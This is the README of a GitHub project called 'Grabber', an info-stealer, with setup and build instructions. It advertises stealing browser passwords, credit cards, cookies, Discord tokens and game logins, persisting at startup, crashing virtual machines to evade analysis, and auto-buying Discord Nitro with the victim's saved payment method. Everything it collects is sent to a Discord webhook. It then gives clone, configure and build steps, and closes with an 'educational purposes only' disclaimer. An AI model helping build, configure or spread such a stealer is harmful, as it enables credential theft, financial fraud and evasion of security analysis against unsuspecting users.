<div align="center">
    <h1>Grabber</h1>
    <small>(Didn't find a better name for it.)</small>
    <br/><br/>
    <a href="https://github.com/JustYuuto/Grabber/issues">
        <img alt="GitHub issues" src="https://img.shields.io/github/issues/JustYuuto/Grabber?style=for-the-badge">
    </a>
    <img alt="Lines of code" src="https://img.shields.io/tokei/lines/github/JustYuuto/Grabber?style=for-the-badge">
    <img alt="GitHub repo size" src="https://img.shields.io/github/repo-size/JustYuuto/Grabber?style=for-the-badge">
</div>

--------------------------

## Functionalities

Some of these functionalities are customisable in the [`config.js`](config.js) file.

Items in bold are functionalities you can get hyped with!

* Works on both Windows, Linux and macOS
* Can add itself to startup programs
* Can get IP info using an API
* Can get OS info, like RAM, CPUs, Kernel version
* Can get Windows product key
* Can kill Discord
* **Can take a screenshot of all monitors**
* **Can get Chrome-based browsers logins and passwords, credit cards, cookies, history** 
* Can get Minecraft and Roblox login
* Can trigger a BSOD if the grabber is run from a virtual machine
* **Can get Discord token (killing the Discord client is not needed)**
* **Can auto-buy Nitro as soon as the user has launched the grabber** (only works if the user have a payment method attached to their Discord account)

All that are sent to a Discord webhook.

## Using it

First, you need to clone the repo and enter the repo directory:

```bash
git clone https://github.com/JustYuuto/Grabber.git
cd Grabber
```

Then you need to configure the [``config.js``](config.js) file, like setting a webhook URL, changing the app name...

When you're done with the configuration, you can build the exe file! Use this command to build it:

```bash
yarn build
```

This will build the Chrome-based browsers encryption key decryptor, the Discord token decryptor, build the icon to a ``.ico`` file, and then build the final exe.

> The EXE build can be **very long** (about 20 minutes), so be very patient ^^

## Responsibility

I, Yuuto, and other contributors, will not accept any responsibility case for damage done using this tool. This was made for educational and demonstration purposes only.
